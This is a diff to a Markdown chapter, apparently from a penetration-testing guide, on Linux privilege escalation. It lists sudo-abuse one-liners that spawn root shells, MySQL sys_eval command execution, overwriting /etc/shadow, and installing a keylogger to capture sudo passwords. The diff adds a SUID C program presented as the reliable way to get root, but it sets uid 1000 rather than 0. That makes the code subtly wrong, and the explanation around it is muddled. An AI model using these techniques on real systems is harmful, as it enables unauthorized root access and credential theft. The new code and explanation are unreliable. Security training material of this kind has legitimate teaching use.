@@ -4,21 +4,17 @@ Once we have a limited shell it is useful to escalate that shells privileges. Th
 
 In this chapter I am going to go over these common Linux privilege escalation techniques:
 
-- Kernel exploits
-- Programs running as root
-- Installed software
-- Weak/reused/plaintext passwords
-- Inside service
-- Suid misconfiguration
-- Abusing sudo-rights
-- World writable scripts invoked by root
-- Bad path configuration
-- Cronjobs
-- Unmounted filesystems
-
-
-
-
+* Kernel exploits
+* Programs running as root
+* Installed software
+* Weak/reused/plaintext passwords
+* Inside service
+* Suid misconfiguration
+* Abusing sudo-rights
+* World writable scripts invoked by root
+* Bad path configuration
+* Cronjobs
+* Unmounted filesystems
 
 ## Enumeration scripts
 
@@ -46,8 +42,6 @@ Run the script and save the output in a file, and then grep for warning in it.
 **Linprivchecker.py**
 
 [https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py](https://github.com/reider-roque/linpostexp/blob/master/linprivchecker.py)
-
-
 
 ## Privilege Escalation Techniques
 
@@ -79,7 +73,6 @@ python linprivchecker.py extended
 
 Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. So kernel exploits should be the last resort. Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the `sys.log`. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.
 
-
 ### Programs running as root
 
 The idea here is that if specific service is running as root and you can make that service execute commands you can execute commands as root. Look for webserver, database or anything else like that. A typical example of this is mysql, example is below.
@@ -104,7 +97,6 @@ select sys_eval('whoami');
 ```
 
 If neither of those work you can use a [User Defined Function/](https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/)
-
 
 ### User Installed Software
 
@@ -132,10 +124,9 @@ pkg_info
 
 ### Weak/reused/plaintext passwords
 
-
-- Check file where webserver connect to database (`config.php` or similar)
-- Check databases for admin passwords that might be reused
-- Check weak passwords
+* Check file where webserver connect to database \(`config.php` or similar\)
+* Check databases for admin passwords that might be reused
+* Check weak passwords
 
 ```
 username:username
@@ -146,12 +137,13 @@ username:qwerty
 username:password
 ```
 
-- Check plaintext password
+* Check plaintext password
 
 ```bash
 # Anything interesting the the mail?
 /var/spool/mail
 ```
+
 ```
 ./LinEnum.sh -t -k password
 ```
@@ -204,7 +196,6 @@ find / -perm -g=s -type f 2>/dev/null
 
 If you have a limited shell that has access to some programs using `sudo` you might be able to escalate your privileges with. Any program that can write or overwrite can be used. For example, if you have sudo-rights to `cp` you can overwrite `/etc/shadow` or `/etc/sudoers` with your own malicious file.
 
-
 `awk`
 
 ```
@@ -215,7 +206,7 @@ awk 'BEGIN {system("/bin/bash")}'
 
 `cp`  
 Copy and overwrite /etc/shadow
-   
+
 `find`
 
 ```bash
@@ -223,8 +214,8 @@ sudo find / -exec bash -i \;
 
 find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;
 ```
-   
-`ht`  
+
+`ht`
 
 The text/binary-editor HT.
 
@@ -238,7 +229,7 @@ v
 :shell
 ```
 
-`more`  
+`more`
 
 You need to run more on a file that is bigger than your screen.
 
@@ -258,7 +249,6 @@ Overwrite `/etc/shadow` or `/etc/sudoers`
 `nc`
 
 `nmap`
-
 
 `python/perl/ruby/lua/etc`
 
@@ -348,6 +338,8 @@ cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
 ```
 
+Ocassionally within these cronjobs, certain running programs may have been coded poorly.  It is highly recommended to refer to the bible of Linux wildcard injection: [https://www.defensecode.com/public/DefenseCode\_Unix\_WildCards\_Gone\_Wild.txt](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt) when checking for issues in cronjobs.
+
 ### Unmounted filesystems
 
 Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.
@@ -393,26 +385,39 @@ int main()
 }
 ```
 
+Note that this type of exploit will not always work.  The above sets the uid, but upon actually executing the script, you may find that you still maintain the same privileges.  I believe that bash can drop permissions to what's known as the effective-uid to avoid suid vulnerabilities as above.  In this case, the best bet is to use the below code.
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+int main( int argc, char *argv[] )
+{
+	seteuid(1000);
+	setgid(1000);
+	setuid(1000);
+	setreuid(1000, 1000);
+	printf("ID: %d\n", geteuid());
+	execve("/bin/sh", NULL, NULL);
+}	
+```
 
 ## Steal password through a keylogger
 
 If you have access to an account with sudo-rights but you don't have its password you can install a keylogger to get it.
 
-
-
 ## Other useful stuff related to privesc
 
 **World writable directories**
 
-``` 
+```
 /tmp
 /var/tmp
 /dev/shm
 /var/spool/vbox
 /var/spool/samba
 ```
-
-
 
 ## References
 
